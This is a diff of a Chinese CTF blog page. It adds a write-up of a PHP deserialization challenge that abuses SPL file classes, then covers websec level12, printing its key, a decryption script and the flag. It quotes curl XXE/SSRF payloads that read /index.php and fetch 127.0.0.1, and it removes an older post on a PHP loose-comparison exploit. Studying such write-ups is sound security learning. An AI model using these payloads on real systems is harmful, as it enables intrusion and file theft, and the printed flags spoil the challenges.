@@ -74,6 +74,7 @@
   </style>
 </noscript>
 
+<link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -154,6 +155,238 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/30/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0serialize/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/30/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0serialize/" class="post-title-link" itemprop="url">DASCTF三月复现</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-30 15:24:45 / 修改时间：17:16:34" itemprop="dateCreated datePublished" datetime="2021-03-30T15:24:45+08:00">2021-03-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params">$code</span>)</span>&#123;</span><br><span class="line">        $pattern = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑还是挺好捋的……这里关键是对php原生文件操作类的应用：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>类</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DirectoryIterator</td>
+<td>遍历目录。</td>
+</tr>
+<tr>
+<td>FilesystemIterator</td>
+<td>遍历目录。</td>
+</tr>
+<tr>
+<td>GlobIterator</td>
+<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*。</td>
+</tr>
+<tr>
+<td>SplFileObject</td>
+<td>读取文件，按行读取，多行需要遍历；URL 可作为文件名，受到<code>allow_url_fopen</code>影响。</td>
+</tr>
+<tr>
+<td>finfo/finfo_open()</td>
+<td>需要两个参数，读取文件。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就可以控制class为SPL(标准PHP类库)中的文件操作类。</p>
+<p>但是……DirectoryIterator和FilesystemIterator 作为迭代器，需要循环遍历输出每一个不同的目录下文件，所以直接输出只显示第一个文件</p>
+<p>GlobIterator可以使用通配符搜索，同样，只显示搜素到的第一个文件……</p>
+<p>这道题就是利用FilesystemIterator找flag文件，SplFileObject读取flag文件</p>
+<p>来看类似的一道题：</p>
+<h3 id="websec-LevelTwelve"><a href="#websec-LevelTwelve" class="headerlink" title="websec-LevelTwelve"></a>websec-LevelTwelve</h3><p><a target="_blank" rel="noopener" href="http://websec.fr/level12/index.php">http://websec.fr/level12/index.php</a></p>
+<p>finfo的利用：</p>
+<blockquote>
+<h2 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h2><p><strong>FINFO</strong> (<em>file-id</em>,<em>info-item</em>)</p>
+<ul>
+<li><strong>file-id</strong></li>
+<li>specifies the identifier that was assigned when the file was opened (generally by the FOPEN function).</li>
+<li><strong>info-item</strong></li>
+<li>specifies the number of the information item that is to be retrieved.</li>
+</ul>
+<p>FINFO函数为先前已打开并由FOPEN函数分配了<strong>文件ID</strong>的外部文件返回指定信息项的值。</p>
+<p>FINFO，FOPTNAME和FOPTNUM函数支持以下信息项。</p>
+<p><strong>file-id</strong>：</p>
+<p><strong>Information Items for Unix System Services Files</strong></p>
+<p><strong><em>Unix系统服务文件的信息项</em></strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>Item</strong></th>
+<th><strong>项目标识符</strong></th>
+<th><strong>Definition</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>File Name文件名</td>
+<td>File name</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Access Permission存取权限</td>
+<td>Read, write, and execute permissions for owner, group, and other</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Number of Links链接数</td>
+<td>Number of links in the file</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Owner Name所有者名称</td>
+<td>User ID of the owner</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Group Name团队名</td>
+<td>Name of the owner’s access group</td>
+</tr>
+<tr>
+<td>6</td>
+<td>File Size文件大小</td>
+<td>File size</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Last Modified最后修改</td>
+<td>Date file last modified</td>
+</tr>
+</tbody></table>
+<p><strong><em>Information Items for Sequential Files and members of PDSs and PDSEs</em></strong></p>
+<p><strong><em>顺序文件以及PDS和PDSE成员的信息项</em></strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>Item</strong></th>
+<th><strong>Item Identifier</strong></th>
+<th><strong>Definition</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Dsname名称</td>
+<td>File name</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Unit单元</td>
+<td>Disk type</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Volume体积</td>
+<td>Volume on which data setresides</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Disp显示</td>
+<td>Disposition</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Blksize</td>
+<td>Block size</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Lrecl</td>
+<td>Record length</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Recfm</td>
+<td>Record format</td>
+</tr>
+</tbody></table>
+<p><strong>info-item</strong>：所打开的文件</p>
+</blockquote>
+<p>好不容易查到的资料，似乎也没什么用……</p>
+<p><img src="/images/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20210330162313649.png" alt="image-20210330162313649"></p>
+<p>控制类名读取index.php</p>
+<p><img src="/images/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20210330162402047.png" alt="image-20210330162402047"></p>
+<p>这里大量的报错，带出了许多文件内容，</p>
+<p>具体原因：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/167140#h2-7">https://www.anquanke.com/post/id/167140#h2-7</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Congratulation, you can read this file, but this is not the end of our journey.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- Thanks to cutz for the QA.</span></span><br><span class="line"><span class="comment">- Thanks to blotus for finding a (now fixed) weakness in the &quot;encryption&quot; function.</span></span><br><span class="line"><span class="comment">- Thanks to nurfed for nagging us about a cheat</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$text = <span class="string">&#x27;Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==&#x27;</span>;</span><br><span class="line">$key = ini_get (<span class="string">&#x27;user_agent&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] !== $key) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;Cheating is bad, m&#x27;kay?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (str_split (base64_decode ($text)) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">        $flag .= chr (ord ($key[$i++]) ^ ord ($letter));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span> ($flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来就是获取key了</p>
+<p>借助SplFileObject的特性，访问我们的IP，监听获取use_agent，也就是key</p>
+<p><img src="/images/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20210330164631817.png" alt="image-20210330164631817"></p>
+<p>加一个<code>\</code>就可以绕过……：</p>
+<blockquote>
+<p>Without any namespace definition, all class and function definitions are placed into the global space - as it was in PHP before namespaces were supported. Prefixing a name with \ will specify that the name is required from the global space even in the context of the namespace.</p>
+<p>百度机翻：</p>
+<p>没有任何名称空间定义，所有的类和函数定义都放在全局空间中——就像在支持名称空间之前的PHP中一样。在名称前面加上\将指定该名称必须来自全局空间，即使在命名空间的上下文中也是如此。</p>
+</blockquote>
+<img src="/images/DASCTF三月复现/image-20210330164826855.png" alt="image-20210330164826855" style="zoom:200%;" />
+
+<p>获得key：aiviGohdahvueL0dedi5hievi0Ahsh1aor9aiQu5eemaisi7Phai9PhohpheiweiP7eifooVooviesh9meighoolahm3Phe0Ii6gieL1Pidoodiephein3iK8tae3aec</p>
+<p>解密脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = <span class="string">&quot;aiviGohdahvueL0dedi5hievi0Ahsh1aor9aiQu5eemaisi7Phai9PhohpheiweiP7eifooVooviesh9meighoolahm3Phe0Ii6gieL1Pidoodiephein3iK8tae3aec&quot;</span>;</span><br><span class="line">$text = <span class="string">&quot;Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==&quot;</span>;</span><br><span class="line">$flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (str_split (base64_decode ($text)) <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    $flag .= chr (ord ($key[$i++]) ^ ord ($letter));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="comment">//WEBSEC&#123;Many_thanks_to_hackyou2014_web400_MSLC_&lt;3&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>大佬的ssrf（这是利用了xml吗……tql）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">得到源码:</span><br><span class="line">curl -s --data &#39;submit&#x3D;&amp;class&#x3D;SimpleXMLElement&amp;param2&#x3D;2&amp;param1&#x3D;&lt;!DOCTYPE xxe [&lt;!ENTITY foo SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;index.php&quot;&gt;]&gt;&lt;root&gt;%26foo;&lt;&#x2F;root&gt;&#39; http:&#x2F;&#x2F;websec.fr&#x2F;level12&#x2F;index.php | grep -oE -m1 &#39;&lt;pre&gt;(.*)&lt;&#x2F;pre&gt;&#39; </span><br><span class="line">可以继续获取php.ini，路径未知， </span><br><span class="line">也可以: 通过ssrf获取flag: </span><br><span class="line">curl -s --data &#39;submit&#x3D;&amp;class&#x3D;SimpleXMLElement&amp;param2&#x3D;2&amp;param1&#x3D;&lt;!DOCTYPE xxe [&lt;!ENTITY foo SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;level12&#x2F;index.php&quot;&gt;]&gt;&lt;root&gt;%26foo;&lt;&#x2F;root&gt;&#39; http:&#x2F;&#x2F;websec.fr&#x2F;level12&#x2F;index.php | grep -oE -m1 &#39;WEBSEC&#123;.*&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1016,88 +1249,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/10/xctf-lottery/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/10/xctf-lottery/" class="post-title-link" itemprop="url">xctf-lottery</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-03-10 12:43:53 / 修改时间：13:18:23" itemprop="dateCreated datePublished" datetime="2021-03-10T12:43:53+08:00">2021-03-10</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="xctf-lottery"><a href="#xctf-lottery" class="headerlink" title="xctf-lottery"></a>xctf-lottery</h4><h5 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h5><h5 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h5><p>lottery，彩票网站……</p>
-<p>攻防世界直接给了附件，实际上题目存在/.git源码泄露：</p>
-<img src="/images/xctf-lottery/image-20210310124701047.png" alt="image-20210310124701047" style="zoom:60%;" />
-
-<p>很多php文件，有session的储存，但似乎不是flask session伪造，config里也没有key之类的……大部分操作都集成在api中，api接受json格式的数据。不像Hgame的微积分数学题，可以自动获取公式计算刷分，这里的彩票数字是随机的：</p>
-<p><img src="/images/xctf-lottery/image-20210310125320868.png" alt="image-20210310125320868"></p>
-<p>那网站哪里会出问题，既没有像样的用户登录，session似乎也没毛病……</p>
-<p>原来是php弱比较导致的漏洞：</p>
-<p><img src="/images/xctf-lottery/image-20210310130729735.png" alt="image-20210310130729735"></p>
-<blockquote>
-<p>……</p>
-</blockquote>
-<p>直接遍历了输入的number，number的正常输入本应该为字符串，但json支持数组</p>
-<blockquote>
-<p>注意，在使用==比较时，true是可以和任何类型的字符串或数字相等，返回true，当然0和false和null除外（true==0或true==false或true==null）</p>
-</blockquote>
-<p>可以使用数组传入布尔值达到恒等：</p>
-<img src="/images/xctf-lottery/image-20210310131637110.png" alt="image-20210310131637110" style="zoom:80%;" />
-
-<img src="/images/xctf-lottery/image-20210310131712557.png" alt="image-20210310131712557" style="zoom:89%;" />
-
-<blockquote>
-<p>刷钱买flag即可……</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1169,7 +1320,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">82</span>
+          <span class="site-state-item-count">83</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
